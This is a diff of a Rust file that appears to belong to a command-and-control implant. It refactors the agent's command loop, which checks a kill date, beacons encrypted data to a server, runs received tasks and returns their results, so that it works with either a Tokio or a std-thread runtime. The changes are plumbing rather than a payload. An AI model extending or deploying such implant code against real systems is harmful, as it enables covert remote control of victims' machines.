@@ -1,8 +1,14 @@
 use core::ffi::c_void;
-use std::sync::Arc;
+#[cfg(feature = "std-runtime")]
+use std::sync::mpsc;
 
-#[cfg(feature = "tokio-runtime")]
-use tokio::runtime::Runtime;
+use std::sync::Arc;
+use std::thread;
+
+#[cfg(feature = "std-runtime")]
+use mod_std_runtime::CustomRuntime;
+
+use rs2_runtime::Runtime;
 #[cfg(feature = "tokio-runtime")]
 use tokio::sync::mpsc;
 
@@ -28,9 +34,16 @@ use mod_protocol_winhttp::protocol::WinHttpProtocol;
 
 use crate::command::exit_command;
 use crate::common::generate_path;
-use crate::spawner::TaskSpawner;
 
-pub fn command_handler(rt: Arc<TokioRuntimeWrapper>) {
+#[cfg(feature = "tokio-runtime")]
+use crate::spawner::TaskSpawner;
+#[cfg(feature = "std-runtime")]
+use crate::spawner::TaskSpawnerCustomRuntime;
+
+pub fn command_handler<R>(rt: Arc<R>)
+where
+    R: Runtime + 'static,
+{
     unsafe {
         if !instance().session.connected {
             return;
@@ -38,16 +51,26 @@ pub fn command_handler(rt: Arc<TokioRuntimeWrapper>) {
 
         //KillDate
         if check_kill_date(instance().config.kill_date) {
-            rt.handle().block_on(async { exit_command(1).await });
+            rt.block_on(async { exit_command(1).await });
         }
 
         // !Working Hours -> continue
 
         // Prepare the TaskSpawner
+        #[cfg(feature = "tokio-runtime")]
         let spawner = TaskSpawner::new(rt.handle().clone());
+        #[cfg(feature = "tokio-runtime")]
         let (result_tx, result_rx) = mpsc::channel::<TaskOutput>(16); // Tokio mpsc channel for results.
 
         // Start the result handler
+        #[cfg(feature = "tokio-runtime")]
+        let result_handler_handle = result_handler(rt.clone(), result_rx);
+
+        #[cfg(feature = "std-runtime")]
+        let spawner = TaskSpawnerCustomRuntime::new(rt.clone());
+        #[cfg(feature = "std-runtime")]
+        let (result_tx, result_rx) = mpsc::channel::<TaskOutput>(); // Tokio mpsc channel for results.
+        #[cfg(feature = "std-runtime")]
         let result_handler_handle = result_handler(rt.clone(), result_rx);
 
         #[cfg(any(feature = "protocol-json", feature = "protocol-winhttp"))]
@@ -67,9 +90,7 @@ pub fn command_handler(rt: Arc<TokioRuntimeWrapper>) {
 
             data.with_metadata(metadata);
 
-            let result = rt
-                .handle()
-                .block_on(async { protocol.write(data, Some(encryptor.clone())).await });
+            let result = rt.block_on(async { protocol.write(data, Some(encryptor.clone())).await });
 
             if result.is_ok() {
                 // Aggiungi il parsing di un array di SimpleAgentCommand, con protocol.read, lascia commentate queste righe
@@ -100,35 +121,47 @@ pub fn command_handler(rt: Arc<TokioRuntimeWrapper>) {
                         }
                     };
 
+                    #[cfg(feature = "tokio-runtime")]
                     let result_tx = result_tx.clone(); // Clone the result transmitter for each task.
-                    let receiver = rt
-                        .handle()
-                        .block_on(async { spawner.spawn_task(command).await }); // Spawn the task and get the result receiver.
+                    #[cfg(feature = "tokio-runtime")]
+                    let receiver = rt.block_on(async { spawner.spawn_task(command).await }); // Spawn the task and get the result receiver.
 
+                    #[cfg(feature = "tokio-runtime")]
                     // Spawn a task to send the task's result to the result handler.
-                    rt.handle().spawn(async move {
+                    rt.spawn(async move {
                         if let Ok(result) = receiver.await {
                             let _ = result_tx.send(result).await; // Send the result to the result handler.
                         }
                     });
+
+                    #[cfg(feature = "std-runtime")]
+                    let receiver = spawner.spawn_task(command); // Spawn the task and get the result receiver.
+
+                    #[cfg(feature = "std-runtime")]
+                    // Send the task's result to the result handler.
+                    if let Ok(result) = receiver.recv() {
+                        let _ = result_tx.send(result);
+                    }
                 }
             }
         }
 
-        rt.handle().block_on(async {
+        #[cfg(feature = "tokio-runtime")]
+        rt.block_on(async {
             drop(result_tx); // Close the result channel, indicating no more tasks will send results.
             result_handler_handle.await.unwrap(); // Wait for the result handler to finish processing all results.
         });
     }
 }
 
-pub fn result_handler(
-    rt: Arc<TokioRuntimeWrapper>,
-    mut result_rx: mpsc::Receiver<TaskOutput>,
-) -> tokio::task::JoinHandle<()> {
+pub fn result_handler<R>(rt: Arc<R>, mut result_rx: mpsc::Receiver<TaskOutput>)
+where
+    R: Runtime,
+{
     let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };
     let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
 
+    #[cfg(feature = "tokio-runtime")]
     rt.handle().spawn(async move {
         while let Some(result) = result_rx.recv().await {
             // Send the result to the server using the protocol
@@ -137,7 +170,30 @@ pub fn result_handler(
                 .await
                 .unwrap();
         }
-    })
+    });
+
+    #[cfg(feature = "std-runtime")]
+    // Spawn a separate thread to handle and process the results.
+    let result_handler = thread::spawn(move || {
+        while let Ok(result) = result_rx.recv() {
+            // Create a new reference to protocol inside the loop
+            let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
+            let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };
+
+            // Block on the async write operation using the runtime's block_on method
+            rt.block_on(async move {
+                protocol
+                    .write(result.clone(), Some(encryptor.clone()))
+                    .await
+                    .unwrap();
+            });
+
+            // println!("Result {}: {:?}", i, result);
+        }
+    });
+
+    // #[cfg(feature = "std-runtime")]
+    // result_handler.join().unwrap();
 }
 
 /// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
